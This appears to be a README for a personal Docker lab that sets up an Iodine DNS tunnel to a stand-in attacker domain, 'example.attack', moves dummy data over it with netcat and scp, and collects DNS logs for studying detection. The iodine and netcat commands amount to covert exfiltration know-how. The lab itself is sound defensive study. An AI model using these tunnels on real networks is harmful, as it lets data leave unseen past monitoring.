## DNS Tunneling
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

This is a personal experiment with Iodine to explore how DNS tunneling works as well as for log analysis purposes.
Main motivation was due to reading of <a href="https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152">SANS's interesting paper on the topic</a>. 

This project consists of three Docker containers:
* Iodine server in "control" of the "example.attack" domain.
* DNS Server forwarding requests to Iodined. (dnsmasq)
* Iodine client on which to create the DNS tunnel and exfiltrate data.

A circleci matrix pipeline was created to generate some example log files for various dunnel configuration combinations(encoding x record types). This produced some interesting looking log files which are attached to this repo.

### Docker-Compose
```console
#### Create the network and containers asap ####
$ docker-compose up
```

### Manual Approach
<details>
<summary>In case you'd want to build everything without docker-compose.</summary>
<p>

```console
#### Create Network ####
$ docker network create --subnet=172.18.0.0/16 dns-network

#### Build all containers ####
$ docker build -t attack_server attack_server/.
$ docker build -t attack_client attack_client/.
$ docker build -t dns_server dns_server/.

#### Run all containers ####
$ docker run -d --privileged --net dns-network --ip 172.18.0.2 --rm --name attack_server attack_server
$ docker run -d --privileged --net dns-network --ip 172.18.0.3 --rm --name attack_client attack_client
$ docker run -itd --privileged --net dns-network --ip 172.18.0.4 --rm -p 53:53/udp -v $PWD/dnsmasq.conf:/etc/dnsmasq.conf -v $PWD/dnsmasq-logs:/var/log --name dns_server2 dns_server

#### Enter each as you see fit ####
$ docker exec -it attack_client bash
$ docker exec -it attack_server bash
$ docker exec -it dns_server sh
```

</p>
</details>

### Customize Iodine Commands
By default the Iodine client in the attached Docker container not setup the tunnel. This has been automated in the circleci pipeline but should now be issued by hand. Main things to vary are the encoding (-O) and DNS record types used for the tunnel (-T). "example.attack" is the fake domain in control by a would-be scoundrel.
<details>
<summary>However you might want to see some other possibilities.</summary>
<p>

```console
$ docker exec -it attack_client bash
$ iodine -4 -f -P abc123 -r 172.18.0.4 example.attack & # Let Iodine autodetect/optimize encoding and DNS request types.
$ iodine -4 -f -P abc123 -Ttxt -Oraw -r 172.18.0.4 example.attack & # Force Iodine to use TXT records and raw encoding.
```

</p>
</details>

### Exchange some data
<details>
<summary>By default a text file with lorum-ipsum is generated of around 2MB and can be copied over; this is also what's been automated in circleci pipeline.</summary>
<p>

```console
#### netcat ####
# From Server
$ nc -l -s 10.0.0.1 -p 1234

# From Client
$ nc 10.0.0. 1234

#### SSH ####
# From Server
$ fallocate -l 100M file.out
$ $(which sshd) -D

#### From Client (pwd = 'root') ####
$ scp root@10.0.0.1:file.out ~/

#### From DNS Server observe logged queries ####
$ watch ls -lah /var/log/dnsmasq.log
```

</p>
</details> 


<details>
<summary>Additionally one can eavesdrop on the docker network using tshark / wireshark to see the raw requests.</summary>
<p>

```console
$ tshark -T fields -e dns.qry.name -i docker0

# One might have to find out the correct interface first:
$ docker exec -ti <container id> cat /sys/class/net/eth0/iflink
$ ip link | grep <number>
```

</p>
</details>







